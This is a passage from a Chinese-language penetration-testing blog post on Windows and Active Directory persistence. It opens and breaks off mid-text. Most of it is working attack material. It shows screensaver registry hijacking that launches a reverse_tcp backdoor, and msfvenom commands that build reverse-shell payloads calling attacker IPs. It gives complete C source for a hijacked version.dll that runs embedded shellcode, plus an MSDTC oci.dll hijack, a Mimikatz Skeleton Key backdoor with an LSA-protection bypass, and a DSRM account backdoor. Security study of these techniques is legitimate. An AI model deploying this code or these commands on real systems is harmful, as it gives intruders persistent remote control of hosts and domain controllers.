进程中创建子进程以运行后门程序reverse_tcp.exe.</p><p><img src="http://cdn.clown2024.cn/202407151710514.png" alt="image-20240417155154992"></p><h2><span id="利用屏幕保护程序">利用屏幕保护程序</span></h2><p>屏幕保护是 Windows 系统的一项功能，可以在用户一段时间不活动后播放屏幕消息或图形动画。屏幕保护程序由具有.scr文件扩展名的可执行文件组成。系统注册表项HKEY_CURRENT_USER\Control Panel\Desktop 下存储了用来设置屏幕保护程序的键值。</p><table><thead><tr><th>键名</th><th>说明</th></tr></thead><tbody><tr><td>SCRNSAVE.EXE</td><td>设置屏幕保护程序的路径，其指向以.scr为扩展名的可执行文件</td></tr><tr><td>ScreenSaveActive</td><td>设置是否需要启用屏幕保护程序，默认为1表示启用</td></tr><tr><td>ScreenSaveIsSecure</td><td>设置是否需要密码解锁，设置为0则不需要密码</td></tr><tr><td>ScreenSaveTimeOut</td><td>设置执行屏幕保护程序之前用户不活动的超时时间</td></tr></tbody></table><p>我们可以修改屏幕保护的执行路径，当触发屏幕保护时执行后门程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">将触发屏幕保护时执行的程序设为自定义的恶意程序，这里的程序以.scr或.exe为扩展名皆可</span><br>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v SCRNSAVE.EXE /t REG_SZ /d &quot;C:\Users\Marcus\reverse_tcp.scr&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">启用屏幕保护</span><br>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveActive /t REG_SZ /d 1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置不需要密码解锁</span><br>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveIsSecure /t REG_SZ /d &quot;0&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">将用户不活动的超时设置为60秒</span><br>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveTimeOut /t REG_SZ /d &quot;60&quot;<br></code></pre></td></tr></table></figure><p>该方法不需要管理员权限，标准用户权限即可。</p><p>默认情况下，除 ScreenSaveActive 的值为1外，其余三个键都不存在，所以需要手动创建。并且，触发的恶意程序只能在当前用户的上下文中运行。</p><p><img src="http://cdn.clown2024.cn/202407151710515.png" alt="image-20240417164930891"></p><h2><span id="dll劫持">DLL劫持</span></h2><p>之前UACBypass也用过这项技术，这里通过DLL劫持来建立持久化后门，该方法需要管理员权限。</p><p><strong>劫持应用程序</strong></p><p>以Navicat Premium 15为例。</p><p>启动Navicat然后通过Process Monitor监控其进程，过滤出加载的DLL，可以看出，navicat.exe进程加载DLL文件的顺序。</p><p><img src="http://cdn.clown2024.cn/202407151710516.png" alt="image-20240417165957692"></p><blockquote><p>Navicat首先尝试在自身的安装目录中加载 version.dll，但是安装目录中 version.dll 不存在，所以会继续尝试在系统目录C:\Windows\System32中加载version.dll，并成功加载</p></blockquote><p>依照这样我们就可以构造恶意DLL放入Navicat的安装目录。</p><p>通常情况下，构造的恶意 DLL 需要与原来的合法 DLL 具有相同的导出函数。可以使用 AheadLib 工具获取合法的 version.dll 的导出函数，并自动化生成劫持代码。</p><p>在“输入 DLL”中填入合法 DLL 的绝对路径，在“输出CPP”中填入生成的劫持代码的保存路径，在“转发”中勾选“直接转发函数”，“原始DLL”中的值设为“versionOrg“</p><p><img src="http://cdn.clown2024.cn/202407151710517.png" alt="image-20240417170341170"></p><p>点击生成就能生成一份劫持代码，这是生成的代码：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><br><br><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// 头文件</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><br><br><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// 导出函数</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoA=versionOrg.GetFileVersionInfoA,@1&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoByHandle=versionOrg.GetFileVersionInfoByHandle,@2&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoExA=versionOrg.GetFileVersionInfoExA,@3&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoExW=versionOrg.GetFileVersionInfoExW,@4&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeA=versionOrg.GetFileVersionInfoSizeA,@5&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeExA=versionOrg.GetFileVersionInfoSizeExA,@6&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeExW=versionOrg.GetFileVersionInfoSizeExW,@7&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeW=versionOrg.GetFileVersionInfoSizeW,@8&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoW=versionOrg.GetFileVersionInfoW,@9&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerFindFileA=versionOrg.VerFindFileA,@10&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerFindFileW=versionOrg.VerFindFileW,@11&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerInstallFileA=versionOrg.VerInstallFileA,@12&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerInstallFileW=versionOrg.VerInstallFileW,@13&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerLanguageNameA=versionOrg.VerLanguageNameA,@14&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerLanguageNameW=versionOrg.VerLanguageNameW,@15&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerQueryValueA=versionOrg.VerQueryValueA,@16&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerQueryValueW=versionOrg.VerQueryValueW,@17&quot;</span>)</span><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><br><br><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)<br>&#123;<br><span class="hljs-built_in">DisableThreadLibraryCalls</span>(hModule);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_DETACH)<br>&#123;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><br></code></pre></td></tr></table></figure><p>该代码通过pragma预处理指令实现函数转发，以确保应用程序能正常启动。</p><p>应用程序的运行依赖于原始 DLL 文件中提供的函数，恶意 DLL 必须提供相同功能的函数才能保证程序的正常运行。因此编写 DIL劫持代码时，需要通过函数转发，将应用程序调用的函数从恶意 DIL重定向到原始的合法 DLL。</p><blockquote><p>例如在上述代码中,当 Navicat需要调用合法 DLL 文件中的 GetFileVersionInfoA 函数时，系统会根据给出的 pragma 指令直接转发给 versionOrg.dll 中的 GetFileVersionInfoA 函数去执行。由于劫持的原始 DLL(version.dll)位于System32 目录中，因此需要将 pragma指令中的“versionOrg”替换成C:\Windows\System32\version”(路径中的反斜杠需要转义)。</p></blockquote><p>然后我们需要编写一个DoMagic函数，用来申请虚拟内存并执行Metasploit生成的ShellCode</p><p>msf生成shellcode的指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/shell/reverse_tcp LHOST=192.168.28.0 LPORT=2333 -a x86 -f c<br></code></pre></td></tr></table></figure><p>DoMagic函数的代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//申请内存并执行ShellCode</span><br>DWORD WINAPI <span class="hljs-title function_">DoMagic</span><span class="hljs-params">(LPVOID lpParameter)</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] =<br><span class="hljs-string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span><br><span class="hljs-string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span><br><span class="hljs-string">&quot;\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span><br><span class="hljs-string">&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x50&quot;</span><br><span class="hljs-string">&quot;\x8b\x48\x18\x01\xd3\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31&quot;</span><br><span class="hljs-string">&quot;\xff\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75&quot;</span><br><span class="hljs-string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span><br><span class="hljs-string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span><br><span class="hljs-string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span><br><span class="hljs-string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span><br><span class="hljs-string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span><br><span class="hljs-string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x14\x80\x68\x02\x00&quot;</span><br><span class="hljs-string">&quot;\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="hljs-string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span><br><span class="hljs-string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span><br><span class="hljs-string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span><br><span class="hljs-string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span><br><span class="hljs-string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span><br><span class="hljs-string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span><br><span class="hljs-string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span><br><span class="hljs-string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span><br><span class="hljs-string">&quot;\x00\x53\xff\xd5&quot;</span>;<br>    <span class="hljs-type">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode,<span class="hljs-keyword">sizeof</span> shellcode);<br>    ((<span class="hljs-type">void</span>(*)())exec)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>DllMain函数时整个DLL文件的入口函数，可以创建线程调用劫持后需要进行的功能。在DllMain函数中添加以下代码，创建进程调用DoMagic函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, DoMagic, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(hThread)&#123;<br>    CloseHandle(hThread);<br>&#125;<br></code></pre></td></tr></table></figure><p>最终的DLL劫持代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 头文件</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-comment">// 导出函数</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoA=versionOrg.GetFileVersionInfoA,@1&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoByHandle=versionOrg.GetFileVersionInfoByHandle,@2&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoExA=versionOrg.GetFileVersionInfoExA,@3&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoExW=versionOrg.GetFileVersionInfoExW,@4&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeA=versionOrg.GetFileVersionInfoSizeA,@5&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeExA=versionOrg.GetFileVersionInfoSizeExA,@6&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeExW=versionOrg.GetFileVersionInfoSizeExW,@7&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeW=versionOrg.GetFileVersionInfoSizeW,@8&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoW=versionOrg.GetFileVersionInfoW,@9&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerFindFileA=versionOrg.VerFindFileA,@10&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerFindFileW=versionOrg.VerFindFileW,@11&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerInstallFileA=versionOrg.VerInstallFileA,@12&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerInstallFileW=versionOrg.VerInstallFileW,@13&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerLanguageNameA=versionOrg.VerLanguageNameA,@14&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerLanguageNameW=versionOrg.VerLanguageNameW,@15&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerQueryValueA=versionOrg.VerQueryValueA,@16&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerQueryValueW=versionOrg.VerQueryValueW,@17&quot;</span>)</span><br><br><span class="hljs-comment">//申请内存并执行ShellCode</span><br>DWORD WINAPI <span class="hljs-title function_">DoMagic</span><span class="hljs-params">(LPVOID lpParameter)</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] =<br><span class="hljs-string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span><br><span class="hljs-string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span><br><span class="hljs-string">&quot;\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span><br><span class="hljs-string">&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x50&quot;</span><br><span class="hljs-string">&quot;\x8b\x48\x18\x01\xd3\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31&quot;</span><br><span class="hljs-string">&quot;\xff\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75&quot;</span><br><span class="hljs-string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span><br><span class="hljs-string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span><br><span class="hljs-string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span><br><span class="hljs-string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span><br><span class="hljs-string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span><br><span class="hljs-string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x14\x80\x68\x02\x00&quot;</span><br><span class="hljs-string">&quot;\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="hljs-string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span><br><span class="hljs-string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span><br><span class="hljs-string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span><br><span class="hljs-string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span><br><span class="hljs-string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span><br><span class="hljs-string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span><br><span class="hljs-string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span><br><span class="hljs-string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span><br><span class="hljs-string">&quot;\x00\x53\xff\xd5&quot;</span>;<br>    <span class="hljs-type">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode,<span class="hljs-keyword">sizeof</span> shellcode);<br>    ((<span class="hljs-type">void</span>(*)())exec)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 入口函数</span><br>BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br>&#123;<br><span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)<br>&#123;<br>DisableThreadLibraryCalls(hModule);<br>        HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, DoMagic, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(hThread)&#123;<br>    CloseHandle(hThread);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_DETACH)<br>&#123;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后使用Visual Studio创建DLL项目进行编译，以生成恶意的version.dll</p><p><img src="http://cdn.clown2024.cn/202407151710518.png" alt="image-20240418224137630"></p><p>然后将生成的恶意dll放入Navicat安装目录即可，不过后期这些应该都要做免杀才行，本地生成立马就拦了</p><p><img src="http://cdn.clown2024.cn/202407151710519.png" alt="image-20240418224240983"></p><p><strong>劫持系统服务</strong></p><p>MSDTC(Distributed Transaction Coordinator，分布式事务处理协调器)是 Windows系统服务，负责协调跨多个数据库、消息队列、文件系统等资源管理器的事务。</p><p>MSDTC 服务启动后，将尝试在C:\Windows\System32目录中加载oci.dll 文件，但是该文件不存在</p><p><img src="http://cdn.clown2024.cn/202407151710520.png" alt="image-20240417183948223"></p><p>测试人员可以制作一个同名的恶意DLL并放入System32目录。当MSDTC服务启动时，恶意DLL将加载到msdtc.exe进程。</p><p>可以用Metasploit直接生成一个恶意DLL</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p Windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -f dll -o oci.dll<br></code></pre></td></tr></table></figure><p>生成一个oci.dll文件然后上传到C:\Windows\System32目录下，当系统服务重启时，目标主机就会重新上线，并且权限为NETWORK SERVICE。</p><p>在某些版本中MSDTC服务的启动类型默认为”手动”，我们可以修改为自动实现权限持久化</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc config msdtc start= &quot;auto&quot;<br></code></pre></td></tr></table></figure><h1><span id="常见域后门技术">常见域后门技术</span></h1><p>当获取域控制器的权限后，为了防止对域控制器权限的丢失，测试人员需要使用些特定的持久化技术来维持已获取到的域权限。</p><h2><span id="创建skeleton-key域后门">创建Skeleton Key域后门</span></h2><p>Skeleton Key 即“万能钥匙”。通过在域控制器上安装 Skeleton Key，所有域用户账户都可以使用一个相同的密码进行认证，同时原有密码仍然有效。该技术通过注入lsass.exe 进程实现，创建的 Skeleton Key 仅保留在内存中，如果域控重启，Skeleton Key就会失效。利用该技术需要拥有域管理员级别的权限。</p><p><strong>常规利用</strong></p><p>将Mimikatz上传到域控，执行下面命令创建Skeleton Key后门</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;misc::seleton&quot; exit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710521.png" alt="image-20240417190149716"></p><p>执行后，，将为所有的域账户设置一个相同的密码”mimikatz”，从而可以登录域控。</p><p><strong>缓解措施</strong></p><p>微软在2014年3月添加了LSA(Local Security Authority,本地安全机构)保护策略用来防止对lsass.exe 进程的内存读取和代码注入。通过执行以下命令，可以开启或关闭LSA 保护。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开启LSA保护策略</span><br>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v RunAsPPL /t REG_DWORD /d 1 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭LSA保护策略</span><br>reg delete &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v RunAsPPL<br></code></pre></td></tr></table></figure><p>重启系统后，Mimikatz的相关操作都会失败。此时即使已经获取了Debug权限也无法读取用户哈希值，更无法安装SkeletonKey.</p><p><img src="http://cdn.clown2024.cn/202407151710522.png" alt="image-20240417195040956"></p><p>不过，Mimikatz在2013年就已经支持绕过LSA保护，该功能需要Mimikatz项目中的mimidrv.sys驱动文件，Skeleton Key的安装命令就变成如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz # privilege::debug<br>mimikatz # !+<br>mimikatz # !processprotect /process:lsass.exe /remove<br>mimikatz # misc::skeleton<br></code></pre></td></tr></table></figure><h2><span id="创建dsrm域后门">创建DSRM域后门</span></h2><p>DSRM(Directory Services Restore Mode，目录服务还原模式)是域控制器的安全模式启动选项，用于使服务器脱机，以进行紧急维护。在初期安装 Windows 域服务时，安装向导会提示用户设置 DSRM 的管理员密码。有了该密码后，网络管理员可以在后期域控发生问题时修复、还原或重建活动目录数据库。</p><p>在域控上DSRM账户实际上就是本地管理员账户。通过在域控上运行NTDSUtil(是一个自带的用于管理和维护活动目录的工具)，可以为DSRM账户修改密码，步骤如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">进入ntdsutil</span><br>ntdsutil<br><span class="hljs-meta prompt_"># </span><span class="language-bash">进入设置DSRM账户密码设置模式</span><br>set dsrm password<br><span class="hljs-meta prompt_"># </span><span class="language-bash">在当前域控上恢复DSRM密码</span><br>reset password on server null<br><span class="hljs-meta prompt_"># </span><span class="language-bash">输入新密码</span><br>&lt;password&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">退出DSRM密码设置模式</span><br>q<br><span class="hljs-meta prompt_"># </span><span class="language-bash">退出ntdsutil</span><br>q<br></code></pre></td></tr></table></figure><p>测试人员可以通过修改 DSRM 账户的密码，以维持对域控制器权限。该技术适用于Windows Server 2008 及以后版本的服务器，并需要拥有域管理员级别的权限。</p><p>下面是Mimikatz的利用过程</p><ol><li><p>读取SAM文件获取DSRM账户的哈希值</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit<br></code></pre></td></tr></table></figure></li><li><p>修改DSRM的登陆模式，允许该账户的远程登陆。可以通过编辑注册表的 DsrmAdminLogonBehavior 键值来实现，可选用的登录模式有以下3种。</p><p>0：默认值，只有当域控制器重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号。</p><p>1：只有当本地 AD、DS 服务停止时，才可以使用 DSRM 管理员账号登录域控制器。</p><p>2：在任何情况下，都可以使用 DSRM 管理员账号登录域控制器。</p><p>所以我们就要修改登陆模式为2：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f<br></code></pre></td></tr></table></figure></li><li><p>然后就可以通过DSRM账号对域控进行控制了。我们可以根据上面获得的哈希对域控执行哈希传递攻击获取域控权限</p><p><img src="http://cdn.clown2024.cn/202407151710523.png" alt="image-20240418230425352"></p></li></ol><h2><span id="sid-history的利用">SID History的利用</span></h2><p><strong>SID &amp; SID History</strong></p><p>在 Windows 系统中，SID(Security 